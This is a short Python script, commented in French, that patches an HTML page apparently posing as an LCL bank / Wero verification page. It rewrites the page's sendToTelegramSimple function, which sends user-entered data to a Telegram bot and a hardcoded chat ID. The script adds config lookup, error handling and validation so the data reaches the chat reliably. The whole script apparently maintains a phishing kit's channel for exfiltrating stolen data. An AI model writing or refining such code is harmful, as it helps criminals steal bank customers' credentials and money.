import re

# Lire le fichier
with open("wero.verification/lcl.html", 'r', encoding='utf-8') as f:
    content = f.read()

# Remplacer le token hardcodé par window.telegramConfig
old_token = "const TELEGRAM_BOT_TOKEN = '[REDACTED]';\n    const TELEGRAM_CHAT_ID = '6078788670';"
new_token = "const TELEGRAM_BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';\n    const TELEGRAM_CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';"

content = content.replace(old_token, new_token)

# Améliorer la gestion des erreurs dans la fonction sendToTelegramSimple
old_error = """if (response.ok) {
                const result = await response.json();
                console.log("✅ Succès Telegram");
                return { success: true, message: "✅ Données envoyées à Telegram!" };
            } else {
                return { success: false, message: "❌ Erreur: " + response.status };
            }"""

new_error = """const result = await response.json();
            
            if (result.ok) {
                console.log("✅ Succès Telegram");
                return { success: true, message: "✅ Données envoyées à Telegram!" };
            } else {
                console.error("Telegram API error:", result);
                return { success: false, message: "❌ Erreur Telegram: " + (result.description || result.error_code) };
            }"""

content = content.replace(old_error, new_error)

# Ajouter une vérification de la config au début de la fonction
pattern = r'async function sendToTelegramSimple\(data\) \{\s*console\.log\("🚀 ENVOI TELEGRAM LCL"\);'
replacement = '''async function sendToTelegramSimple(data) {
        console.log("🚀 ENVOI TELEGRAM LCL");
        console.log("Token:", TELEGRAM_BOT_TOKEN);
        console.log("Chat ID:", TELEGRAM_CHAT_ID);
        
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'NOT_SET' || !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'NOT_SET') {
            console.error("Config Telegram manquante");
            return { success: false, message: "❌ Configuration Telegram manquante" };
        }'''

content = re.sub(pattern, replacement, content)

# Écrire le fichier corrigé
with open("wero.verification/lcl.html", 'w', encoding='utf-8') as f:
    f.write(content)

print("LCL.html fixed successfully!")
print("Changes made:")
print("1. Replaced hardcoded token with window.telegramConfig")
print("2. Improved error handling")
print("3. Added config validation")
